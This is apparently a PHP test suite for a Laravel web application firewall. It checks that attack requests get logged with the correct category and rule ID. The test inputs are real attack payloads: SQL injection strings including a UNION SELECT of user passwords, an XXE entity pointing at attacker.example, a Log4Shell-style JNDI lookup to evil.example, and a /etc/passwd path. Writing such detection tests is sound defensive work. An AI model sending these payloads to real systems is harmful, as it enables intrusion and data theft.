<?php

use Illuminate\Support\Facades\DB;

it('inspects the POST body', function () {
    $this->post('/', ['q' => "' OR 1=1 --"])->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('sqli')
        ->and($log->rule_ids)->toContain('942120')
        ->and($log->method)->toBe('POST');
});

it('inspects a raw XML body for XXE', function () {
    $xml = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://attacker.example/xxe">]><r>&x;</r>';

    $this->call('POST', '/', [], [], [], ['CONTENT_TYPE' => 'application/xml'], $xml)->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('xxe')
        ->and($log->rule_ids)->toContain('944100');
});

it('inspects request headers', function () {
    $this->get('/', ['X-Forwarded-Host' => '${jndi:ldap://evil.example/a}'])->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->rule_ids)->toContain('944150');
});

it('inspects cookies', function () {
    $this->withUnencryptedCookie('sid', "' UNION SELECT password FROM users")
        ->get('/')
        ->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->rule_ids)->toContain('942100');
});

it('inspects the URL path', function () {
    $this->get('/etc/passwd')->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('lfi')
        ->and($log->rule_ids)->toContain('930110');
});
